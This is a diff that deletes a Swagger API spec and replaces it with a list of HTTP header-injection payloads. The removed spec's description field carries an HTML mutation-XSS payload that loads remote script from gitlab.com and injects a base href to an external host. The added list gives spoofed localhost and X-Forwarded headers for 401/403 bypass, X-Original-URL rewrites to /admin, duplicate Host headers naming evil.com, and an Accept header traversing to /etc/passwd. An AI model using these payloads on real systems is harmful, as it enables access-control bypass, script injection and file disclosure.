@@ -1,20 +1,120 @@
-swagger: '2.0'
-info:
-  title: Classic API Resource Documentation
-  description: |  
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a href=https://gitlab.com/yvvdwf/_/-/jobs/552156057/artifacts/raw/alert.js data-type=script style='cursor: default;overflow: visible;width: 1000px;position: fixed;height: 2000px;margin: 0;display: block;box-sizing: initial;' data-remote=true class='atwho-view select2-drop-mask pika-select'><div style='width: 100vw;height: 100vh;position: fixed;'></div></a><base href='https://ec2.ap-east-1.amazonaws.com/XD/'>"></form>
+Base-Url: 127.0.0.1
+Client-IP: 127.0.0.1
+Http-Url: 127.0.0.1
+Proxy-Host: 127.0.0.1
+Proxy-Url: 127.0.0.1
+Real-Ip: 127.0.0.1
+Redirect: 127.0.0.1
+Referer: 127.0.0.1
+Referrer: 127.0.0.1
+Refferer: 127.0.0.1
+Request-Uri: 127.0.0.1
+Uri: 127.0.0.1
+Url: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 4443
+X-Forwarded-Port: 80
+X-Forwarded-Port: 8080
+X-Forwarded-Port: 8443
+X-Forwarded-Scheme: http
+X-Forwarded-Scheme: https
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Host: 127.0.0.1
+X-Http-Destinationurl: 127.0.0.1
+X-Http-Host-Override: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Url: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Proxy-Url: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Rewrite-Url: 127.0.0.1
+X-True-IP: 127.0.0.1
+# Add something like 127.0.0.1, localhost, 192.168.1.2, target.com or /admin, /console
+Client-IP:
+Connection:
+Contact:
+Forwarded:
+From:
+Host:
+Origin:
+Referer:
+True-Client-IP:
+X-Client-IP:
+X-Custom-IP-Authorization:
+X-Forward-For:
+X-Forwarded-For:
+X-Forwarded-Host:
+X-Forwarded-Server:
+X-Host:
+X-Original-URL:
+X-Originating-IP:
+X-Real-IP:
+X-Remote-Addr:
+X-Remote-IP:
+X-Rewrite-URL:
+X-Wap-Profile:
 
-  version: production
-basePath: /
-security:
-  - basicAuth: []
-paths:
-  /accounts:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - accounts
-      operationId: findAccounts
-      summary: Finds all accounts
+# Try to repeat same Host header 2 times
+Host: legit.com
+Stuff: stuff
+Host: evil.com
+
+# Bypass type limit
+Accept: application/json, text/javascript, */*; q=0.01
+Accept: ../../../../../../../../../etc/passwd{{'
+
+# Try to change the HTTP version from 1.1 to HTTP/0.9 and remove the host header
+
+# 401/403 bypasses 
+# Whitelisted IP 127.0.0.1 or localhost
+Client-IP: 127.0.0.1
+Forwarded-For-Ip: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded-For: localhost
+Forwarded: 127.0.0.1
+Forwarded: localhost
+True-Client-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forward: 127.0.0.1
+X-Forward: localhost
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-By: localhost
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For-Original: localhost
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded-Server: localhost
+X-Forwarded: 127.0.0.1
+X-Forwarded: localhost
+X-Forwared-Host: 127.0.0.1
+X-Forwared-Host: localhost
+X-Host: 127.0.0.1
+X-Host: localhost
+X-HTTP-Host-Override: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-Addr: localhost
+X-Remote-IP: 127.0.0.1
+X-Original-URL: /admin
+X-Override-URL: /admin
+X-Rewrite-URL: /admin
+Referer: /admin
+X-HTTP-Method-Override: PUT
+Host: evil-website.com
+Host: vulnerable-website.com
+Host: evil-website.com
